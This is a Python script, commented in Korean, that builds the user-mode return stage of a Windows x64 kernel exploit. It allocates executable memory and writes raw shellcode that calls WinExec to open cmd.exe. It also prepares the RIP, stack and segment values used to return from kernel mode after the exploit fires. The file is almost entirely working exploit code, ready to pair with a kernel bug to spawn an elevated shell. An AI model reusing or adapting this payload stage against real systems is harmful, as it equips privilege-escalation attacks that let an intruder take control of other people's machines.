"""
WinExec Shellcode Setup — 유저 모드 복귀 (Trampoline Code)
WinExec("cmd.exe", SW_SHOW)를 호출하여 새 창을 엽니다. (데드락 방지)
"""

import ctypes
import struct

kernel32 = ctypes.windll.kernel32

# ── 상수 정의 ──────────────────────────────────────────────
MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

# ── [중요] 64비트 포인터 반환 타입 명시 (충돌 방지) ─────────
# ctypes는 기본적으로 c_int(32비트)를 반환합니다.
# x64에서 포인터가 4GB를 넘으면 잘림 → 크래시 원인.
kernel32.VirtualAlloc.restype  = ctypes.c_void_p
kernel32.VirtualAlloc.argtypes = [
    ctypes.c_void_p,   # lpAddress
    ctypes.c_size_t,   # dwSize
    ctypes.c_uint32,   # flAllocationType
    ctypes.c_uint32,   # flProtect
]
kernel32.GetProcAddress.restype  = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

# ==========================================================
# 1. "cmd.exe" 문자열 메모리에 쓰기
# ==========================================================
cmd_str = b"cmd.exe\x00"
cmd_str_addr = kernel32.VirtualAlloc(
    0, len(cmd_str), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
)
if not cmd_str_addr:
    raise RuntimeError("VirtualAlloc failed for cmd_str")
ctypes.memmove(cmd_str_addr, cmd_str, len(cmd_str))

# ==========================================================
# 2. WinExec 함수 주소 구하기
# ==========================================================
# kernel32._handle 사용 — 이미 Python int(64비트)이므로
# GetModuleHandleW보다 안전합니다 (restype 문제 없음).
WinExec_addr = kernel32.GetProcAddress(kernel32._handle, b"WinExec")
if not WinExec_addr:
    raise RuntimeError("Failed to resolve WinExec address")

# ==========================================================
# 3. 유저 모드 쉘코드 (Trampoline)
# ==========================================================
# WinExec("cmd.exe", SW_SHOW);
#
#   mov rcx, cmd_str_addr      ; 인자 1: "cmd.exe" 포인터
#   mov rdx, 5                 ; 인자 2: SW_SHOW = 5
#   mov rax, WinExec_addr      ; WinExec 함수 주소
#   sub rsp, 0x20              ; Shadow Space 확보 (x64 ABI)
#   call rax                   ; WinExec 실행
#   add rsp, 0x20              ; 스택 복구
#   jmp $                      ; 무한루프 (프로세스 유지)
#
# [참고] sub rsp를 0x28이 아닌 0x20으로 설정하는 이유:
#   쉘코드는 iretq/sysret으로 진입 (call이 아님) →
#   RSP가 이미 16바이트 정렬 상태.
#   0x28(40)은 정렬을 깨뜨리고, 0x20(32)은 유지합니다.

user_stub = (
    b"\x48\xB9" + struct.pack('<Q', cmd_str_addr)       # mov rcx, cmd_str_addr
    + b"\x48\xC7\xC2\x05\x00\x00\x00"                  # mov rdx, 5  (SW_SHOW)
    + b"\x48\xB8" + struct.pack('<Q', WinExec_addr)     # mov rax, WinExec_addr
    + b"\x48\x83\xEC\x20"                               # sub rsp, 0x20
    + b"\xFF\xD0"                                        # call rax
    + b"\x48\x83\xC4\x20"                               # add rsp, 0x20
    + b"\xEB\xFE"                                        # jmp $
)

# 쉘코드 메모리 할당
user_stub_addr = kernel32.VirtualAlloc(
    0, len(user_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
)
if not user_stub_addr:
    raise RuntimeError("VirtualAlloc failed for user_stub")
ctypes.memmove(user_stub_addr, user_stub, len(user_stub))

# ==========================================================
# 4. 리턴 주소(RIP) 및 유저 스택 설정
# ==========================================================
user_rip = user_stub_addr

user_stack_base = kernel32.VirtualAlloc(
    0, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
)
if not user_stack_base:
    raise RuntimeError("VirtualAlloc failed for user_stack")

user_sp     = user_stack_base + 0x10000 - 0x100
user_cs     = 0x33
user_ss     = 0x2b
user_rflags = 0x246

# ==========================================================
# 결과 출력
# ==========================================================
print(f"[+] cmd.exe String  @ {hex(cmd_str_addr)}")
print(f"[+] WinExec Address @ {hex(WinExec_addr)}")
print(f"[+] Shellcode Size  : {len(user_stub)} Bytes")
print(f"[+] Return User RIP : {hex(user_rip)}")
print(f"[+] Return User SP  : {hex(user_sp)}")
print(f"[+] CS={hex(user_cs)}  SS={hex(user_ss)}  RFLAGS={hex(user_rflags)}")
